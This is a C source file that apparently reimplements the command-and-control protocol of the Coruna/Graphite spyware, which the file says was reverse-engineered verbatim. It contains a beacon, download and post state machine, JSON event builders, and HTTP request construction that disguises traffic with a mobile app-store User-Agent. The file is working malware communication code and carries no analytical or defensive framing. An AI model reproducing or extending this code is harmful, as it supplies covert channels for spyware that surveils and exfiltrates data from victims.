// graphite_c2_protocol.c - C2 Protocol (C)
// Based on VERBATIM C2 protocol from Coruna/Graphite reverse engineering

#include "graphite_c2_protocol.h"
#include <stdio.h>
#include <string.h>

C2P_EXPORT void c2p_init(C2Context *ctx, const char *base_url) {
    if (!ctx) return;
    memset(ctx, 0, sizeof(C2Context));
    ctx->state = C2_ST_IDLE;
    if (base_url) {
        strncpy(ctx->base_url, base_url, sizeof(ctx->base_url) - 1);
    }
}

C2P_EXPORT int c2p_transition(C2Context *ctx, int new_state) {
    if (!ctx) return 0;

    // Validate transitions
    switch (ctx->state) {
        case C2_ST_IDLE:
            if (new_state == C2_ST_DOWNLOAD || new_state == C2_ST_BEACON) return 1;
            break;
        case C2_ST_DOWNLOAD:
            if (new_state == C2_ST_BUSY || new_state == C2_ST_ERROR) return 1;
            break;
        case C2_ST_BUSY:
            if (new_state == C2_ST_QBRDR || new_state == C2_ST_ERROR || new_state == C2_ST_DONE) return 1;
            break;
        case C2_ST_QBRDR:
            if (new_state == C2_ST_POST || new_state == C2_ST_ERROR) return 1;
            break;
        case C2_ST_POST:
            if (new_state == C2_ST_DONE || new_state == C2_ST_ERROR) return 1;
            break;
        case C2_ST_ERROR:
            if (new_state == C2_ST_IDLE || new_state == C2_ST_BEACON) return 1;
            break;
        case C2_ST_BEACON:
            if (new_state == C2_ST_IDLE || new_state == C2_ST_DOWNLOAD) return 1;
            break;
        default:
            break;
    }
    return 0;
}

C2P_EXPORT size_t c2p_build_json_event(char *out, size_t out_size, unsigned int e, unsigned int l) {
    if (!out || out_size == 0) return 0;
    int n = snprintf(out, out_size, C2_JSON_EVENT, e, l);
    if (n < 0 || (size_t)n >= out_size) return 0;
    return (size_t)n;
}

C2P_EXPORT size_t c2p_build_json_event_file(char *out, size_t out_size, unsigned int e, const char *f, unsigned int l) {
    if (!out || !f || out_size == 0) return 0;
    int n = snprintf(out, out_size, C2_JSON_EVENT_FILE, e, f, l);
    if (n < 0 || (size_t)n >= out_size) return 0;
    return (size_t)n;
}

C2P_EXPORT size_t c2p_build_json_logmsg(char *out, size_t out_size, const char *msg) {
    if (!out || !msg || out_size == 0) return 0;
    int n = snprintf(out, out_size, C2_JSON_LOGMSG, msg);
    if (n < 0 || (size_t)n >= out_size) return 0;
    return (size_t)n;
}

C2P_EXPORT size_t c2p_build_request(char *out, size_t out_size, C2Context *ctx) {
    if (!out || !ctx || out_size == 0) return 0;
    int n;
    if (ctx->http_method == C2_METHOD_GET) {
        n = snprintf(out, out_size,
            "GET %s/%s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Content-Type: %s\r\n"
            "\r\n",
            ctx->base_url, ctx->filename, ctx->base_url,
            C2_UA_MOBILE_STORE, C2_CONTENT_TYPE);
    } else {
        n = snprintf(out, out_size,
            "POST %s/%s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Content-Type: %s\r\n"
            "Content-Length: %zu\r\n"
            "\r\n"
            "%s",
            ctx->base_url, ctx->filename, ctx->base_url,
            C2_UA_MOBILE_STORE, C2_CONTENT_TYPE, ctx->body_len, ctx->body);
    }
    if (n < 0 || (size_t)n >= out_size) return 0;
    return (size_t)n;
}

C2P_EXPORT int c2p_parse_status(const char *response, size_t len) {
    if (!response || len < 12) return 0;
    // Parse "HTTP/1.1 XXX" status line
    if (strncmp(response, "HTTP/", 5) != 0) return 0;
    const char *space = strchr(response, ' ');
    if (!space) return 0;
    return atoi(space + 1);
}

C2P_EXPORT const char* c2p_state_name(int state) {
    switch (state) {
        case C2_ST_IDLE:     return "IDLE";
        case C2_ST_DOWNLOAD: return "DOWNLOAD";
        case C2_ST_BUSY:     return "BUSY";
        case C2_ST_QBRDR:    return "QBRDR";
        case C2_ST_ERROR:    return "ERROR";
        case C2_ST_DONE:     return "DONE";
        case C2_ST_BEACON:   return "BEACON";
        case C2_ST_POST:     return "POST";
        default:             return "UNKNOWN";
    }
}
